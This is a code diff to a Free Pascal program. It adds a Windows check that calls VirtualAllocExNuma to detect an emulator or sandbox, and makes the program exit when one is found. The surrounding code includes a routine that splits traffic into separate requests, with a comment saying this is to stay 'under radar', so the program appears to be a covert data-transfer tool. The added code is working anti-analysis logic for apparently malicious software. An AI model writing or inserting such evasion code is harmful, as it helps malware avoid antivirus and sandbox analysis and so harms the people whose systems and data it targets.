@@ -32,7 +32,7 @@
 
 program project1;
 
-{$mode objfpc}{$H+}
+{$mode delphi}
 
 uses
   {$IFDEF UNIX}{$IFDEF UseCThreads}
@@ -115,6 +115,21 @@ begin
 end;
 {$IFEND}
 
+
+{$IFDEF Windows}
+function isEmulated :boolean;
+var
+  mem : intptr;
+begin
+ mem := dword64(VirtualAllocExNuma(GetCurrentProcess(),0,$1000,$3000,$20,0));
+
+ if mem = 0 then
+ result := true
+ else
+  result := false
+
+end;
+{$IFEND}
 function traffic_Seg(const data:string):string;   // send every chunk with separated request in order to be under radar
 var
   tmp_list : Tstringlist;
@@ -267,6 +282,12 @@ var
   y: Integer;
 
 begin
+    {$IFDEF Windows}
+    if isemulated = true
+    then
+      exit
+      else
+     {$IFEND}
 
   for y := 1 to paramcount do begin
       if (paramstr(y)='-h') then begin
